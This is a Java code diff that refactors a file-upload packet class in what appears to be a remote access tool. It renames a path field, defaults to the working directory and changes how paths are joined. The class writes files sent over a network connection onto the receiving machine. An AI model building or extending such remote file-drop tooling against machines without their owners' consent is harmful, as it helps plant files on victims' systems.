@@ -9,10 +9,13 @@ import de.sogomn.rat.util.QuickLZ;
 public final class UploadFilePacket implements IPacket {
 	
 	private byte[] data;
-	private String folderPath, fileName;
+	private String directoryPath, fileName;
+	
+	private static final String USER_DIR = "user.dir";
+	private static final String FILE_SEPARATOR = "/";
 	
 	public UploadFilePacket(final String filePath, final String folderPath) {
-		this.folderPath = folderPath;
+		this.directoryPath = folderPath;
 		
 		final File file = new File(filePath);
 		
@@ -25,7 +28,7 @@ public final class UploadFilePacket implements IPacket {
 	}
 	
 	public UploadFilePacket() {
-		folderPath = fileName = "";
+		directoryPath = fileName = "";
 	}
 	
 	@Override
@@ -34,7 +37,7 @@ public final class UploadFilePacket implements IPacket {
 		
 		connection.writeInt(compressed.length);
 		connection.write(compressed);
-		connection.writeUTF(folderPath);
+		connection.writeUTF(directoryPath);
 		connection.writeUTF(fileName);
 	}
 	
@@ -46,23 +49,27 @@ public final class UploadFilePacket implements IPacket {
 		connection.read(data);
 		data = QuickLZ.decompress(data);
 		
-		folderPath = connection.readUTF();
+		directoryPath = connection.readUTF();
 		fileName = connection.readUTF();
+		
+		if (directoryPath.isEmpty()) {
+			directoryPath = System.getProperty(USER_DIR);
+		}
 	}
 	
 	@Override
 	public void execute(final ActiveConnection connection) {
-		final File folder = new File(folderPath);
+		final File directory = new File(directoryPath);
 		
 		String path = null;
 		
-		if (folder.isDirectory()) {
-			path = folderPath + File.separator + fileName;
+		if (directory.isDirectory()) {
+			path = directoryPath + FILE_SEPARATOR + fileName;
 		} else {
-			final File parent = folder.getParentFile();
+			final File parent = directory.getParentFile();
 			
 			if (parent != null) {
-				path = parent.getAbsolutePath() + File.separator + fileName;
+				path = parent.getAbsolutePath() + FILE_SEPARATOR + fileName;
 			}
 		}
 		
